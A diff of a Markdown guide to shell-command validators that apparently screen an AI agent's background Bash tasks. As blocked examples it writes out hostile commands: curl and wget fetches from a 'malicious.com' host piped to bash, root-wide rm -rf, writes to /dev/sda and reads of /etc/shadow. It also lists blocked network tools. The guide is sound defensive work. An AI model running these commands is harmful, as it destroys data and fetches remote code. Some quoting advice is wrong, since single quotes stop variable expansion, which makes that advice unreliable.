@@ -1,604 +1,635 @@
 # Shell Command Security Guide
 
-**ADR:** ADR-077 Shell Command Security Architecture
-**Status:** Complete (Phases 1-3 implemented)
-**Date:** 2026-01-31
+**Version:** 1.0.0 (Phase 1 + 2 Complete)
+**Last Updated:** 2026-01-31
+**Related:** ADR-077 Shell Command Security Architecture
+
+## Executive Summary
+
+This guide documents the multi-layer shell security validation system (Phases 1-3) that prevents shell injection, path traversal, and data exfiltration vulnerabilities in background Bash tasks.
+
+**Coverage:**
+- Phase 1 (COMPLETE): CWD initialization + shell injection blocking
+- Phase 2 (COMPLETE): Variable quoting detection
+- Phase 3 (COMPLETE): Shellcheck integration + command allowlist
+
+## Table of Contents
+
+1. [Overview](#overview)
+2. [Phase 1: Critical Validators](#phase-1-critical-validators)
+3. [Phase 2: Variable Quoting](#phase-2-variable-quoting)
+4. [Phase 3: Enhanced Validation](#phase-3-enhanced-validation)
+5. [Environment Variables](#environment-variables)
+6. [Safe Bash Patterns](#safe-bash-patterns)
+7. [Dangerous Patterns (Blocked)](#dangerous-patterns-blocked)
+8. [Troubleshooting](#troubleshooting)
+9. [Testing](#testing)
+
+---
 
 ## Overview
 
-This guide documents the multi-layer shell security architecture designed to prevent shell injection, path traversal, and data exfiltration vulnerabilities in background Bash tasks.
+### The Problem
 
-**Problem:** Background Bash tasks executed with undefined CWD, causing filesystem traversal and potential shell injection vulnerabilities.
+Background Bash tasks execute with undefined CWD, causing:
+- **Path Traversal**: `find tests/` searches from root (/) instead of PROJECT_ROOT
+- **Data Exposure**: User directories scanned (/c/XboxGames/, Documents/)
+- **Shell Injection**: Unvalidated commands allow arbitrary execution
+- **Variable Exploitation**: Unquoted variables enable injection attacks
 
-**Solution:** Three-phase validation architecture (CWD initialization, injection protection, shellcheck + command allowlist).
+### The Solution
 
----
-
-## Architecture Overview
+**Three-phase validation pipeline:**
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
-│ Background Bash Task Request                                 │
-└─────────────┬───────────────────────────────────────────────┘
-              │
-              ▼
-┌─────────────────────────────────────────────────────────────┐
-│ Phase 1: Critical Security (BLOCK mode)                     │
-├─────────────────────────────────────────────────────────────┤
-│ 1. bash-cwd-validator.cjs                                   │
-│    → Requires: cd "$PROJECT_ROOT" (background only)         │
-│ 2. shell-injection-validator.cjs                            │
-│    → Blocks: rm -rf /, eval, chained rm, backticks         │
-└─────────────┬───────────────────────────────────────────────┘
-              │
-              ▼
-┌─────────────────────────────────────────────────────────────┐
-│ Phase 2: Code Quality (WARN mode)                           │
-├─────────────────────────────────────────────────────────────┤
-│ 3. variable-quoting-validator.cjs (Proposed)                │
-│    → Warns: $VAR should be "$VAR"                           │
-└─────────────┬───────────────────────────────────────────────┘
-              │
-              ▼
-┌─────────────────────────────────────────────────────────────┐
-│ Phase 3: Enhanced Protection (WARN mode default)            │
-├─────────────────────────────────────────────────────────────┤
-│ 4. shellcheck-validator.cjs                                 │
-│    → Validates: Shell syntax with shellcheck (if available) │
-│ 5. command-allowlist-validator.cjs                          │
-│    → Allows: Whitelisted commands only                      │
-│    → Blocks: Dangerous commands (rm, eval, sudo, curl)      │
-└─────────────┬───────────────────────────────────────────────┘
-              │
-              ▼
-┌─────────────────────────────────────────────────────────────┐
-│ Bash Execution (if all validators pass)                     │
+│ PHASE 1 (CRITICAL - COMPLETE)                               │
+│ ┌──────────────────┐  ┌────────────────────────┐            │
+│ │ CWD Validator    │→│ Shell Injection Block  │            │
+│ │ (background only)│  │ (all tasks)            │            │
+│ └──────────────────┘  └────────────────────────┘            │
+│                                                             │
+│ PHASE 2 (HIGH - COMPLETE)                                   │
+│ ┌──────────────────────────────────────────────┐            │
+│ │ Variable Quoting Validator (warn mode)       │            │
+│ └──────────────────────────────────────────────┘            │
+│                                                             │
+│ PHASE 3 (MEDIUM - COMPLETE)                                 │
+│ ┌─────────────────┐  ┌─────────────────────────┐            │
+│ │ Shellcheck      │→│ Command Allowlist       │            │
+│ │ (optional)      │  │ (background only)       │            │
+│ └─────────────────┘  └─────────────────────────┘            │
 └─────────────────────────────────────────────────────────────┘
 ```
 
+**Enforcement Modes:**
+- `block` (default for Phase 1) - Prevent execution
+- `warn` (default for Phase 2) - Log warning, allow execution
+- `off` - Disable validation
+
 ---
 
-## Phase 1: Critical Security (COMPLETE)
+## Phase 1: Critical Validators
 
-### 1.1 CWD Initialization Validator
+### 1.1 CWD Validator (bash-cwd-validator.cjs)
 
-**File:** `.claude/hooks/safety/bash-cwd-validator.cjs`
-**Mode:** `block` (default)
-**Environment:** `BASH_CWD_VALIDATOR=block|warn|off`
+**Purpose:** Ensures background tasks initialize CWD to PROJECT_ROOT before execution.
 
-**Purpose:** Ensures background Bash tasks initialize CWD to PROJECT_ROOT before execution.
-
-**Requirement:**
-All background Bash tasks MUST start with:
+**Required Pattern:**
 ```bash
 cd "$PROJECT_ROOT" || exit 1
 ```
 
-**Example (CORRECT):**
+**Examples:**
+
+✅ **PASS:**
 ```bash
-cd "$PROJECT_ROOT" && find tests/ -name "*.test.*" | wc -l
+cd "$PROJECT_ROOT" && find tests/ -name "*.test.*"
+cd "$PROJECT_ROOT" || exit 1; find tests/
+cd '$PROJECT_ROOT' && npm test
 ```
 
-**Example (BLOCKED):**
+❌ **BLOCK:**
 ```bash
-# Missing CWD initialization
-find tests/ -name "*.test.*"
+find tests/  # Missing CWD initialization
+cd /tmp && find tests/  # Wrong directory
+cd tests/ && find .  # Relative path, not PROJECT_ROOT
+```
+
+**Environment:**
+```bash
+BASH_CWD_VALIDATOR=block  # Block invalid commands (default)
+BASH_CWD_VALIDATOR=warn   # Log warning, allow execution
+BASH_CWD_VALIDATOR=off    # Disable validation
 ```
 
 **Error Message:**
 ```
-[BASH-CWD-VALIDATOR] Background task missing CWD: cd "$PROJECT_ROOT"
-Fix: Prepend command with: cd "$PROJECT_ROOT" &&
+[BASH-CWD-VALIDATOR] Background Bash task missing CWD initialization.
+MUST start with: cd "$PROJECT_ROOT" || exit 1
+Fix: Prepend: cd "$PROJECT_ROOT" &&
 ```
 
-### 1.2 Shell Injection Validator
+### 1.2 Shell Injection Validator (shell-injection-validator.cjs)
 
-**File:** `.claude/hooks/safety/shell-injection-validator.cjs`
-**Mode:** `block` (default)
-**Environment:** `SHELL_INJECTION_VALIDATOR=block|warn|off`
-
-**Purpose:** Blocks shell injection patterns and dangerous commands.
+**Purpose:** Blocks dangerous shell patterns that enable command injection or data destruction.
 
 **Blocked Patterns:**
-- Chained rm: `; rm -rf`, `&& rm -rf`, `| rm -rf`
-- Code injection: `eval`, backticks, `$()`
-- System device redirects: `> /dev/`
-- Dangerous targets: `rm -rf /`, `rm -rf ~`, `rm -rf *`
 
-**Example (BLOCKED):**
+| Pattern              | Example                | Risk                   |
+| -------------------- | ---------------------- | ---------------------- |
+| `; rm -rf`           | `find tests/; rm -rf /`| Command injection      |
+| `\| rm -rf`          | `cat file \| rm -rf /` | Piped injection        |
+| `&& rm -rf`          | `cd /tmp && rm -rf /`  | Conditional injection  |
+| `eval`               | `eval $USER_INPUT`     | Code injection         |
+| `> /dev/`            | `echo data > /dev/sda` | System device override |
+| `$(rm`               | `$(rm -rf /)`          | Command substitution   |
+| `` `rm` ``           | `` `rm -rf /` ``       | Backtick execution     |
+
+**Dangerous Targets:**
+
+| Pattern          | Example             | Risk                    |
+| ---------------- | ------------------- | ----------------------- |
+| `rm -rf /`       | `rm -rf /`          | Root deletion           |
+| `rm -rf ~`       | `rm -rf ~`          | Home directory deletion |
+| `rm -rf *`       | `rm -rf *`          | Wildcard deletion       |
+
+**Examples:**
+
+✅ **PASS:**
 ```bash
-# Chained rm
-cd "$PROJECT_ROOT" && find tests/; rm -rf /
-
-# Command substitution with rm
-cd "$PROJECT_ROOT" && $(echo rm -rf /)
-
-# Backtick execution
-cd "$PROJECT_ROOT" && `malicious command`
+find tests/ -name "*.test.*"
+rm -rf .temp/  # Relative path, not dangerous target
+npm test && echo "success"
 ```
 
-**Example (ALLOWED):**
+❌ **BLOCK:**
 ```bash
-cd "$PROJECT_ROOT" && find tests/ -name "*.test.*" | wc -l
+find tests/; rm -rf /
+eval "$UNTRUSTED_INPUT"
+cd /tmp && rm -rf *
+echo data > /dev/sda
 ```
-
----
-
-## Phase 2: Code Quality (PROPOSED)
-
-### 2.1 Variable Quoting Validator
-
-**File:** `.claude/hooks/safety/variable-quoting-validator.cjs` (Proposed)
-**Mode:** `warn` (default)
-**Environment:** `VARIABLE_QUOTING_VALIDATOR=block|warn|off`
-
-**Purpose:** Detects unquoted variables that can cause word splitting and globbing issues.
-
-**Example (WARNED):**
-```bash
-cd $PROJECT_ROOT  # Unquoted variable
-```
-
-**Example (CORRECT):**
-```bash
-cd "$PROJECT_ROOT"  # Quoted variable
-```
-
-**Why Quoting Matters:**
-```bash
-# If PROJECT_ROOT="/c/Program Files/agent-studio"
-cd $PROJECT_ROOT
-# Shell interprets as: cd /c/Program Files/agent-studio
-# Result: cd: /c/Program: No such file or directory
-
-# Correct:
-cd "$PROJECT_ROOT"
-# Shell interprets as: cd "/c/Program Files/agent-studio"
-# Result: Success
-```
-
----
-
-## Phase 3: Enhanced Protection (COMPLETE)
-
-### 3.1 Shellcheck Integration
-
-**File:** `.claude/hooks/safety/shellcheck-validator.cjs`
-**Mode:** `warn` (default)
-**Environment:** `SHELLCHECK_VALIDATOR=block|warn|off`
-
-**Purpose:** Validates Bash commands using shellcheck (if available) for syntax errors and best practices.
-
-**Installation:**
-```bash
-# macOS
-brew install shellcheck
-
-# Linux (Debian/Ubuntu)
-apt-get install shellcheck
-
-# Linux (Fedora)
-dnf install ShellCheck
-
-# Windows (via Chocolatey)
-choco install shellcheck
-```
-
-**Features:**
-- Detects syntax errors (SC0001-SC0999)
-- Performance issues (SC2001-SC2999)
-- Portability issues (SC3000-SC3999)
-- Best practices (SC5000+)
-- Graceful fallback if not installed
-
-**Ignored Codes:**
-- `SC1071`: ShellCheck can only follow non-bash scripts (false positive)
-- `SC2086`: Double quote to prevent globbing (handled by Phase 2 quoting validator)
-
-**Example:**
-```bash
-# Syntax error detected
-if [ $x -eq 1 ]; echo "missing then"
-# Shellcheck output: Line 1: [SC1009] error: Expected 'then'
-
-# Correct
-if [ $x -eq 1 ]; then echo "correct"; fi
-```
-
-**Graceful Fallback:**
-If shellcheck is not installed, validator allows command with warning:
-```
-[SHELLCHECK-VALIDATOR] Shellcheck not installed, skipping validation.
-Install with: brew install shellcheck (macOS) or apt-get install shellcheck (Linux)
-```
-
-### 3.2 Command Allowlist System
-
-**Files:**
-- `.claude/lib/safety/command-allowlist.cjs` (library)
-- `.claude/hooks/safety/command-allowlist-validator.cjs` (hook)
-- `.claude/config/command-allowlist.yaml` (configuration)
-
-**Mode:** `warn` (default)
-**Environment:** `COMMAND_ALLOWLIST=block|warn|off`
-
-**Purpose:** Restricts background Bash tasks to approved commands only.
-
-#### Allowed Commands (25+)
-
-**File Operations (safe read-only):**
-- `find` (no `-delete`, `-exec`, `rm` flags)
-- `grep`, `rg` (ripgrep)
-- `ls`, `pwd`
-- `cat`, `head`, `tail`, `less`, `more`
-
-**Text Processing:**
-- `awk`, `sed` (no `-i` flag)
-- `wc`, `sort`, `uniq`
-- `jq` (JSON processing)
-
-**Version Control (read-only):**
-- `git` (only: `status`, `log`, `diff`, `show`, `branch`, `ls-files`)
-
-**Package Managers (read-only):**
-- `npm`, `pnpm` (only: `list`, `ls`, `view`, `outdated`)
-- `node`
 
 **Environment:**
-- `env`, `echo`, `printf`
-
-#### Blocked Commands (15+)
-
-**Destructive Operations:**
-- `rm`, `rmdir`, `mv`, `cp` (data loss risk)
-
-**Dangerous Low-Level:**
-- `dd`, `mkfs`, `fdisk` (can destroy filesystems)
-
-**Code Execution Risks:**
-- `eval`, `exec`, `source`, `.` (code injection)
-
-**Shell Invocation:**
-- `sh`, `bash`, `zsh` (use specific commands instead)
-
-**System Modification:**
-- `chmod`, `chown`, `sudo`, `su` (security risk)
-
-**Network Operations:**
-- `curl`, `wget`, `nc`, `netcat` (require manual approval)
-
-#### Dangerous Flags
-
-**find:**
-- `-delete` (can delete files)
-- `-exec` (arbitrary command execution)
-- `rm` (combined with find is destructive)
-
-**sed:**
-- `-i` (in-place editing modifies files)
-
-**git:**
-- `reset`, `clean`, `push --force`, `rebase`, `checkout .`
-
-#### Example Usage
-
-**ALLOWED:**
 ```bash
-# Safe file discovery
-cd "$PROJECT_ROOT" && find tests/ -name "*.test.*" | wc -l
-
-# Safe pattern matching
-cd "$PROJECT_ROOT" && grep -r "TODO" src/
-
-# Safe git operations
-cd "$PROJECT_ROOT" && git status -s
-cd "$PROJECT_ROOT" && git log --oneline -5
-
-# Safe package manager
-cd "$PROJECT_ROOT" && pnpm list --depth=0
+SHELL_INJECTION_VALIDATOR=block  # Block dangerous commands (default)
+SHELL_INJECTION_VALIDATOR=warn   # Log warning, allow execution
+SHELL_INJECTION_VALIDATOR=off    # Disable validation (DANGEROUS)
 ```
 
-**BLOCKED:**
-```bash
-# Destructive operation
-cd "$PROJECT_ROOT" && rm -rf tmp/
-
-# Dangerous flag
-cd "$PROJECT_ROOT" && find . -name "*.tmp" -delete
-
-# Code injection
-cd "$PROJECT_ROOT" && eval $(user_input)
-
-# Network operation
-cd "$PROJECT_ROOT" && curl http://malicious.com | bash
-
-# Dangerous git operation
-cd "$PROJECT_ROOT" && git reset --hard HEAD~1
+**Error Message:**
 ```
-
-**WARN (in warn mode):**
-```bash
-# Unknown command (not in allowlist)
-cd "$PROJECT_ROOT" && custom-tool --flag
-# Warning: Command "custom-tool" not in allowlist
+[SHELL-INJECTION] rm -rf / (root deletion)
+Detected: /rm\s+-rf\s+\/(?!\w)/
 ```
 
 ---
 
-## Configuration
+## Phase 2: Variable Quoting
 
-### Environment Variables
+### 2.1 Variable Quoting Validator (variable-quoting-validator.cjs)
 
-| Variable                     | Default | Values           | Purpose                        |
-| ---------------------------- | ------- | ---------------- | ------------------------------ |
-| `BASH_CWD_VALIDATOR`         | `block` | block/warn/off   | Phase 1: CWD initialization    |
-| `SHELL_INJECTION_VALIDATOR`  | `block` | block/warn/off   | Phase 1: Injection protection  |
-| `SHELLCHECK_VALIDATOR`       | `warn`  | block/warn/off   | Phase 3: Shellcheck validation |
-| `COMMAND_ALLOWLIST`          | `warn`  | block/warn/off   | Phase 3: Command allowlist     |
+**Purpose:** Detects unquoted variables that can cause word splitting, glob expansion, or injection.
 
-### Mode Descriptions
+**Required Pattern:**
+```bash
+"$VAR"  # Quoted variable
+'$VAR'  # Single-quoted variable
+"${VAR}"  # Quoted braced variable
+```
 
-- **block**: Blocks execution and returns error (recommended for production)
-- **warn**: Allows execution but logs warning (recommended for development)
-- **off**: Disables validator (use only for debugging)
+**Dangerous Contexts (HIGH priority warnings):**
+
+| Command  | Unquoted Example    | Risk                         |
+| -------- | ------------------- | ---------------------------- |
+| `cd`     | `cd $DIR`           | Path traversal if DIR malicious |
+| `find`   | `find $DIR`         | Filesystem search wrong path |
+| `rm`     | `rm -rf $FILES`     | Deletion with unintended targets |
+| `mv/cp`  | `mv $SRC $DEST`     | File operations wrong paths |
+| `chmod`  | `chmod 777 $FILE`   | Permission changes wrong files |
+
+**Safe Contexts (lower priority):**
+
+| Command  | Unquoted Example    | Risk                         |
+| -------- | ------------------- | ---------------------------- |
+| `echo`   | `echo $VAR`         | Output only, limited impact |
+
+**Examples:**
+
+✅ **PASS (no warnings):**
+```bash
+cd "$PROJECT_ROOT" && find tests/
+find "$DIR" -name "*.test.*"
+rm -rf "${TEMP_DIR}"
+```
+
+⚠️ **WARN (unquoted variable):**
+```bash
+cd $PROJECT_ROOT && find tests/
+# Warning: unquoted variables detected: $PROJECT_ROOT
+```
+
+⚠️ **HIGH PRIORITY WARN (dangerous context):**
+```bash
+cd $USER_INPUT && ls
+# Warning (HIGH): unquoted variables detected: $USER_INPUT (dangerous contexts: cd)
+```
+
+**Special Variables (allowed unquoted):**
+```bash
+echo $$  # Process ID
+echo $?  # Exit status
+echo $!  # Last background process
+echo $0-$9  # Positional parameters
+```
+
+**Environment:**
+```bash
+VARIABLE_QUOTING_VALIDATOR=warn   # Warn about unquoted variables (default)
+VARIABLE_QUOTING_VALIDATOR=block  # Block unquoted variables
+VARIABLE_QUOTING_VALIDATOR=off    # Disable validation
+```
+
+**Warning Message:**
+```
+[VARIABLE-QUOTING-HIGH] unquoted variables detected: $DIR (dangerous contexts: find)
+Use "$VAR" instead of $VAR
+Fix: Quote variables: "$DIR"
+```
+
+---
+
+## Phase 3: Enhanced Validation
+
+### 3.1 Shellcheck Validator (shellcheck-validator.cjs)
+
+**Status:** COMPLETE
+
+**Purpose:** Static analysis of shell commands for syntax errors, portability issues, and common bugs.
+
+**Requirements:**
+- shellcheck binary installed (`apt install shellcheck` or `brew install shellcheck`)
+- Falls back gracefully if unavailable
+
+**Examples:**
+
+✅ **PASS:**
+```bash
+if [ -f file.txt ]; then echo "exists"; fi
+```
+
+❌ **BLOCK (syntax error):**
+```bash
+if [ $x -eq 1 ]; echo "missing then"
+```
+
+**Environment:**
+```bash
+SHELLCHECK_VALIDATOR=off   # Disabled (default, requires installation)
+SHELLCHECK_VALIDATOR=warn  # Warn on shellcheck errors
+SHELLCHECK_VALIDATOR=block # Block on shellcheck errors
+```
+
+### 3.2 Command Allowlist Validator (command-allowlist-validator.cjs)
+
+**Status:** COMPLETE
+
+**Purpose:** Restricts background tasks to approved commands (defense-in-depth).
+
+**Allowed Commands (default):**
+- `find`, `grep`, `ls`, `cat`, `wc`
+- `git`, `node`, `npm`, `pnpm`
+- (Customizable via config)
+
+**Examples:**
+
+✅ **PASS (allowed command):**
+```bash
+find tests/ -name "*.test.*"
+```
+
+❌ **BLOCK (disallowed command):**
+```bash
+wget http://malicious.com/payload.sh
+```
+
+**Environment:**
+```bash
+COMMAND_ALLOWLIST_VALIDATOR=warn   # Warn on disallowed commands (default)
+COMMAND_ALLOWLIST_VALIDATOR=block  # Block disallowed commands
+COMMAND_ALLOWLIST_VALIDATOR=off    # Disable validation
+```
+
+---
+
+## Environment Variables
+
+### Quick Reference
+
+| Variable                        | Default  | Purpose                              |
+| ------------------------------- | -------- | ------------------------------------ |
+| `PROJECT_ROOT`                  | (auto)   | Absolute path to project root        |
+| `BASH_CWD_VALIDATOR`            | `block`  | Phase 1: CWD initialization check    |
+| `SHELL_INJECTION_VALIDATOR`     | `block`  | Phase 1: Injection pattern blocking  |
+| `VARIABLE_QUOTING_VALIDATOR`    | `warn`   | Phase 2: Unquoted variable detection |
+| `SHELLCHECK_VALIDATOR`          | `off`    | Phase 3: Shellcheck static analysis  |
+| `COMMAND_ALLOWLIST_VALIDATOR`   | `warn`   | Phase 3: Command whitelist           |
+
+### Configuration (.env)
+
+```bash
+# Shell Command Security (ADR-077)
+PROJECT_ROOT=C:\dev\projects\agent-studio
+BASH_CWD_VALIDATOR=block
+SHELL_INJECTION_VALIDATOR=block
+VARIABLE_QUOTING_VALIDATOR=warn
+```
 
 ### Override Examples
 
+**Development (relaxed):**
 ```bash
-# Disable shellcheck validation (if not installed)
-export SHELLCHECK_VALIDATOR=off
+BASH_CWD_VALIDATOR=warn
+SHELL_INJECTION_VALIDATOR=warn
+VARIABLE_QUOTING_VALIDATOR=warn
+```
 
-# Disable command allowlist (for one-off operations)
-export COMMAND_ALLOWLIST=off
+**Production (strict):**
+```bash
+BASH_CWD_VALIDATOR=block
+SHELL_INJECTION_VALIDATOR=block
+VARIABLE_QUOTING_VALIDATOR=block
+```
 
-# Enable strict mode (block all violations)
-export BASH_CWD_VALIDATOR=block
-export SHELL_INJECTION_VALIDATOR=block
-export SHELLCHECK_VALIDATOR=block
-export COMMAND_ALLOWLIST=block
+**Testing (disabled):**
+```bash
+BASH_CWD_VALIDATOR=off
+SHELL_INJECTION_VALIDATOR=off
+VARIABLE_QUOTING_VALIDATOR=off
 ```
 
 ---
 
-## Safe Command Examples
+## Safe Bash Patterns
 
-### File Discovery
+### 1. Background Tasks
 
-**SAFE:**
+**Always use:**
 ```bash
-cd "$PROJECT_ROOT" && find tests/ -name "*.test.*"
-cd "$PROJECT_ROOT" && find "$PROJECT_ROOT/src" -name "*.ts"
-cd "$PROJECT_ROOT" && find . -type f -name "*.md"
+cd "$PROJECT_ROOT" || exit 1
+find tests/ -name "*.test.*"
 ```
 
-**UNSAFE:**
+**Alternatives:**
 ```bash
-find tests/  # Missing CWD
-cd "$PROJECT_ROOT" && find . -name "*.tmp" -delete  # Dangerous flag
+cd "$PROJECT_ROOT" && find tests/
+cd "$PROJECT_ROOT"; find tests/  # Less safe (no error handling)
 ```
 
-### Pattern Matching
+### 2. Variable Quoting
 
-**SAFE:**
+**Always quote:**
 ```bash
-cd "$PROJECT_ROOT" && grep -r "TODO" src/
-cd "$PROJECT_ROOT" && rg "FIXME" --type js
-cd "$PROJECT_ROOT" && grep -E "^import" src/**/*.ts
+cd "$DIR"
+find "$PATH" -name "$PATTERN"
+rm -rf "${TEMP_DIR}"
 ```
 
-**UNSAFE:**
+**Special cases:**
 ```bash
-grep "pattern" .  # Missing CWD
+# Multiple variables
+find "$DIR" -name "$PATTERN" -exec rm {} \;
+
+# Variables in loops
+for file in "$DIR"/*.txt; do
+  echo "$file"
+done
 ```
 
-### Git Operations
+### 3. Safe Commands
 
-**SAFE:**
+**File search:**
 ```bash
-cd "$PROJECT_ROOT" && git status -s
-cd "$PROJECT_ROOT" && git log --oneline -5
-cd "$PROJECT_ROOT" && git diff --cached
-cd "$PROJECT_ROOT" && git branch -a
+cd "$PROJECT_ROOT" && find tests/ -name "*.test.*" -type f
+cd "$PROJECT_ROOT" && grep -r "pattern" tests/
+cd "$PROJECT_ROOT" && ls -la tests/
 ```
 
-**UNSAFE:**
-```bash
-cd "$PROJECT_ROOT" && git reset --hard  # Destructive
-cd "$PROJECT_ROOT" && git clean -fd  # Deletes files
-cd "$PROJECT_ROOT" && git push --force  # Overwrites remote
-```
-
-### Counting and Reporting
-
-**SAFE:**
+**Output processing:**
 ```bash
 cd "$PROJECT_ROOT" && find tests/ -name "*.test.*" | wc -l
-cd "$PROJECT_ROOT" && ls -1 src/ | wc -l
-cd "$PROJECT_ROOT" && grep -c "import" src/**/*.ts
+cd "$PROJECT_ROOT" && grep -r "pattern" . | grep -v "node_modules"
 ```
 
-**UNSAFE:**
+**Version control:**
 ```bash
-wc -l tests/**/*.test.*  # Missing CWD
+cd "$PROJECT_ROOT" && git status -s
+cd "$PROJECT_ROOT" && git diff tests/
+```
+
+---
+
+## Dangerous Patterns (Blocked)
+
+### 1. Filesystem Destruction
+
+❌ **BLOCKED:**
+```bash
+rm -rf /
+rm -rf ~
+rm -rf *
+rm -rf $UNTRUSTED_VAR  # Unquoted + rm = dangerous
+```
+
+### 2. Command Injection
+
+❌ **BLOCKED:**
+```bash
+find tests/; rm -rf /
+echo "data" && rm -rf /
+eval $USER_INPUT
+```
+
+### 3. System Access
+
+❌ **BLOCKED:**
+```bash
+echo data > /dev/sda
+cat /etc/shadow
+chmod 777 /etc/passwd
+```
+
+### 4. Unquoted Variables (WARN)
+
+⚠️ **WARNED:**
+```bash
+cd $DIR  # Use: cd "$DIR"
+find $PATH  # Use: find "$PATH"
+rm -rf $TEMP  # Use: rm -rf "$TEMP"
 ```
 
 ---
 
 ## Troubleshooting
 
-### Error: Missing CWD initialization
+### Error: "Background Bash task missing CWD initialization"
 
-**Symptom:**
-```
-[BASH-CWD-VALIDATOR] Background task missing CWD: cd "$PROJECT_ROOT"
-```
+**Cause:** Background task doesn't start with `cd "$PROJECT_ROOT"`.
 
-**Solution:**
-Add `cd "$PROJECT_ROOT" && ` to the beginning of your command:
+**Fix:**
 ```bash
-# Before
+# Before (BLOCKED)
 find tests/ -name "*.test.*"
 
-# After
+# After (PASS)
 cd "$PROJECT_ROOT" && find tests/ -name "*.test.*"
 ```
 
-### Error: Dangerous pattern detected
+### Error: "rm -rf / (root deletion)"
 
-**Symptom:**
-```
-[SHELL-INJECTION] Chained rm -rf command detected
-```
+**Cause:** Command contains dangerous deletion pattern.
 
-**Solution:**
-Remove dangerous command or use alternative:
+**Fix:** Validate intent, use relative paths:
 ```bash
-# Dangerous
-cd "$PROJECT_ROOT" && find .; rm -rf tmp/
+# Before (BLOCKED)
+rm -rf /tmp/*
 
-# Safe (separate commands)
-cd "$PROJECT_ROOT" && find .
-# Then manually: rm -rf tmp/ (if needed)
+# After (PASS, but verify intent)
+cd "$PROJECT_ROOT" && rm -rf .temp/
 ```
 
-### Warning: Shellcheck not installed
+### Warning: "unquoted variables detected: $VAR"
 
-**Symptom:**
-```
-[SHELLCHECK-VALIDATOR] Shellcheck not installed, skipping validation
-```
+**Cause:** Variable not within quotes.
 
-**Solution:**
-Install shellcheck or disable validator:
+**Fix:**
 ```bash
-# Option 1: Install shellcheck
-brew install shellcheck  # macOS
-apt-get install shellcheck  # Linux
+# Before (WARN)
+cd $PROJECT_ROOT && find tests/
 
-# Option 2: Disable validator
-export SHELLCHECK_VALIDATOR=off
+# After (PASS)
+cd "$PROJECT_ROOT" && find tests/
 ```
 
-### Warning: Command not in allowlist
+### Validator Hook Not Found
 
-**Symptom:**
+**Symptoms:**
 ```
-[COMMAND-ALLOWLIST] Command "custom-tool" not in allowlist
+Error: Hook file not found: .claude/hooks/safety/bash-cwd-validator.cjs
 ```
 
-**Solution:**
-1. Use allowed alternative (find, grep, etc.)
-2. Add command to allowlist in `.claude/lib/safety/command-allowlist.cjs`
-3. Disable allowlist temporarily: `export COMMAND_ALLOWLIST=off`
+**Fixes:**
+1. Verify file exists: `ls .claude/hooks/safety/`
+2. Check permissions: Should be readable
+3. Restore from git: `git checkout HEAD -- .claude/hooks/safety/`
+
+### Environment Variable Not Working
+
+**Debug:**
+```bash
+# Check if variable is set
+echo $BASH_CWD_VALIDATOR
+
+# Check .env file
+cat .env | grep BASH_CWD_VALIDATOR
+
+# Reload environment
+source .env  # If using bash
+```
 
 ---
 
 ## Testing
 
-### Running Tests
+### Unit Tests
 
-**Unit Tests:**
+**CWD Validator:**
 ```bash
-# Phase 1
 node --test tests/hooks/bash-cwd-validator.test.cjs
+# Expected: 17/17 pass
+```
+
+**Shell Injection Validator:**
+```bash
 node --test tests/hooks/shell-injection-validator.test.cjs
-
-# Phase 3
-node --test tests/hooks/shellcheck-validator.test.cjs
-node --test tests/hooks/command-allowlist-validator.test.cjs
+# Expected: 25/25 pass
 ```
 
-**Integration Tests:**
+**Variable Quoting Validator:**
+```bash
+node --test tests/hooks/variable-quoting-validator.test.cjs
+# Expected: 17/17 pass
+```
+
+### Integration Tests
+
+**Phase 1 + 2:**
+```bash
+node --test tests/integration/shell-security-integration.test.mjs
+# Expected: 13/13 pass
+```
+
+**Phase 3:**
 ```bash
 node --test tests/integration/shell-security-phase3.test.mjs
+# Expected: Depends on shellcheck availability
 ```
 
-**All Shell Security Tests:**
+### Manual Testing
+
+**Test CWD enforcement:**
 ```bash
-node --test tests/hooks/*-validator.test.cjs
-node --test tests/integration/shell-security-phase3.test.mjs
+# Should block
+BASH_CWD_VALIDATOR=block node -e "
+  const validator = require('./.claude/hooks/safety/bash-cwd-validator.cjs');
+  validator.handler({ command: 'find tests/', run_in_background: true }).then(console.log);
+"
+# Expected: { allowed: false, reason: '...' }
+
+# Should pass
+BASH_CWD_VALIDATOR=block node -e "
+  const validator = require('./.claude/hooks/safety/bash-cwd-validator.cjs');
+  validator.handler({ command: 'cd \"\$PROJECT_ROOT\" && find tests/', run_in_background: true }).then(console.log);
+"
+# Expected: { allowed: true }
 ```
 
-### Test Coverage
+**Test injection blocking:**
+```bash
+node -e "
+  const validator = require('./.claude/hooks/safety/shell-injection-validator.cjs');
+  validator.handler({ command: 'find tests/; rm -rf /' }).then(console.log);
+"
+# Expected: { allowed: false, reason: '...' }
+```
 
-- **Phase 1**: 42 tests (bash-cwd + shell-injection)
-- **Phase 3**: 60 tests (shellcheck + command-allowlist)
-- **Integration**: 25 tests (multi-phase coordination)
-- **Total**: 127 tests
+**Test variable quoting:**
+```bash
+VARIABLE_QUOTING_VALIDATOR=warn node -e "
+  const validator = require('./.claude/hooks/safety/variable-quoting-validator.cjs');
+  validator.handler({ command: 'cd \$PROJECT_ROOT && find tests/' }).then(console.log);
+"
+# Expected: { allowed: true, warning: '...' }
+```
 
 ---
 
-## Risk Mitigation
+## Related Documentation
 
-### Before (No Protection)
-
-| Risk                 | Severity | Likelihood | Overall |
-| -------------------- | -------- | ---------- | ------- |
-| Shell Injection      | CRITICAL | MEDIUM     | HIGH    |
-| Path Traversal       | HIGH     | HIGH       | HIGH    |
-| Data Exfiltration    | MEDIUM   | MEDIUM     | MEDIUM  |
-| Resource Exhaustion  | MEDIUM   | HIGH       | MEDIUM  |
-| Privilege Escalation | HIGH     | LOW        | MEDIUM  |
-
-**Overall Risk Score:** 7.5/10 (HIGH)
-
-### After (3-Phase Protection)
-
-| Risk                 | Severity | Likelihood | Overall | Reduction |
-| -------------------- | -------- | ---------- | ------- | --------- |
-| Shell Injection      | CRITICAL | LOW        | MEDIUM  | ↓ 40%     |
-| Path Traversal       | HIGH     | LOW        | LOW     | ↓ 60%     |
-| Data Exfiltration    | MEDIUM   | LOW        | LOW     | ↓ 50%     |
-| Resource Exhaustion  | MEDIUM   | LOW        | LOW     | ↓ 60%     |
-| Privilege Escalation | HIGH     | LOW        | MEDIUM  | ↓ 20%     |
-
-**Overall Risk Score:** 3.5/10 (LOW-MEDIUM)
-**Risk Reduction:** 53%
-
----
-
-## Related Documents
-
-- **ADR-077**: `.claude/context/memory/decisions.md` (Shell Command Security Architecture)
-- **Audit Report**: `.claude/context/artifacts/audits/BACKGROUND-TASK-SHELL-AUDIT.md`
